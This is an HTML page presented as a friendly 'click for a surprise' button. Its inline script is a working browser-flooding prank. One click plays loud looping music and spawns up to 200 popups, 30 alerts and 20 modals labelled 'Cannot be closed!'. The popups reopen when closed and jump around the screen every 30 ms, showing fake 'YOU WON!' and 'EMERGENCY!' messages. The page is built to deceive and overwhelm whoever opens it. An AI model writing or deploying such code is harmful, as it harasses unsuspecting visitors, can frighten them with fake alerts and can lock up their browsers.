<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me!</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>🎉 Welcome! 🎉</h1>
        <p>Click the button below for a surprise!</p>
        <button id="prankButton" class="prank-button">✨ CLICK ME ✨</button>
    </div>

    <audio id="music" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        const button = document.getElementById('prankButton');
        const music = document.getElementById('music');
        let popupCount = 0;
        const maxPopups = 200;

        const popupMessages = [
            "🎵 SURPRISE! 🎵",
            "🎊 CONGRATULATIONS! 🎊",
            "🌟 YOU WON! 🌟",
            "🎁 FREE GIFT! 🎁",
            "🔔 IMPORTANT ALERT! 🔔",
            "⚠️ WARNING! ⚠️",
            "📢 ANNOUNCEMENT! 📢",
            "🎪 PARTY TIME! 🎪",
            "🚨 EMERGENCY! 🚨",
            "💥 BOOM! 💥",
            "🎉 HAPPY DAY! 🎉",
            "🌈 RAINBOWS! 🌈",
            "🦄 UNICORNS! 🦄",
            "🍕 PIZZA TIME! 🍕",
            "🎮 GAME OVER! 🎮",
            "📱 NEW MESSAGE! 📱",
            "🔔 NOTIFICATION! 🔔",
            "⭐ WISH GRANTED! ⭐",
            "🎭 DRAMA! 🎭",
            "🚀 BLAST OFF! 🚀"
        ];

        const activePopups = [];

        function createPopup() {
            if (popupCount >= maxPopups) return;
            
            const popup = window.open('', '_blank', 'width=400,height=300');
            if (popup) {
                popupCount++;
                activePopups.push(popup);
                const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
                popup.document.write(`
                    <html>
                    <head>
                        <title>Popup #${popupCount}</title>
                        <style>
                            body {
                                font-family: Arial, sans-serif;
                                display: flex;
                                justify-content: center;
                                align-items: center;
                                height: 100vh;
                                margin: 0;
                                background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
                                background-size: 400% 400%;
                                animation: gradient 3s ease infinite;
                            }
                            @keyframes gradient {
                                0% { background-position: 0% 50%; }
                                50% { background-position: 100% 50%; }
                                100% { background-position: 0% 50%; }
                            }
                            h1 {
                                color: white;
                                text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
                                font-size: 24px;
                                text-align: center;
                            }
                        </style>
                    </head>
                    <body>
                        <h1>${randomMessage}</h1>
                        <p style="color: white; text-align: center;">Popup #${popupCount} of ${maxPopups}</p>
                        <p style="color: white; text-align: center; font-size: 12px;">You cannot close this window!</p>
                    </body>
                    </html>
                `);
                
                // Make popup harder to close
                popup.onbeforeunload = function() {
                    return "Are you sure you want to leave?";
                };
                
                // Try to prevent closing
                popup.onunload = function() {
                    window.open('', '_blank', 'width=400,height=300');
                };
                
                // Position popup randomly
                const randomX = Math.random() * (screen.width - 400);
                const randomY = Math.random() * (screen.height - 300);
                popup.moveTo(randomX, randomY);
            }
        }

        function movePopups() {
            activePopups.forEach(popup => {
                if (popup && !popup.closed) {
                    const randomX = Math.random() * (screen.width - 400);
                    const randomY = Math.random() * (screen.height - 300);
                    popup.moveTo(randomX, randomY);
                }
            });
        }

        function createAlerts() {
            for (let i = 0; i < 30; i++) {
                setTimeout(() => {
                    const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
                    alert(`${randomMessage}\n\nAlert #${i + 1} of 30`);
                }, i * 300);
            }
        }

        const activeModals = [];

        function createModals() {
            for (let i = 0; i < 20; i++) {
                setTimeout(() => {
                    const modal = document.createElement('div');
                    modal.className = 'modal moving-modal';
                    modal.style.left = Math.random() * 80 + 10 + '%';
                    modal.style.top = Math.random() * 80 + 10 + '%';
                    modal.innerHTML = `
                        <div class="modal-content">
                            <h2>${popupMessages[Math.floor(Math.random() * popupMessages.length)]}</h2>
                            <p>Modal #${i + 1} - Cannot be closed!</p>
                        </div>
                    `;
                    document.body.appendChild(modal);
                    activeModals.push(modal);
                }, i * 200);
            }
        }

        function moveModals() {
            activeModals.forEach(modal => {
                modal.style.left = Math.random() * 80 + 10 + '%';
                modal.style.top = Math.random() * 80 + 10 + '%';
            });
        }

        button.addEventListener('click', () => {
            // Play music at maximum volume
            music.volume = 1.0;
            music.play().catch(e => console.log('Audio play failed:', e));
            
            // Create massive amounts of popups
            for (let i = 0; i < 100; i++) {
                setTimeout(createPopup, i * 100);
            }
            
            // Create alerts immediately
            setTimeout(createAlerts, 500);
            
            // Create modals immediately
            setTimeout(createModals, 300);
            
            // Keep spawning popups continuously
            setInterval(() => {
                if (popupCount < maxPopups) {
                    createPopup();
                }
            }, 200);
            
            // Move popups extremely fast
            setInterval(movePopups, 30);
            
            // Move modals extremely fast
            setInterval(moveModals, 30);
            
            // Change button text
            button.textContent = '🎉 TOO LATE! 🎉';
            button.disabled = true;
        });
    </script>
</body>
</html>
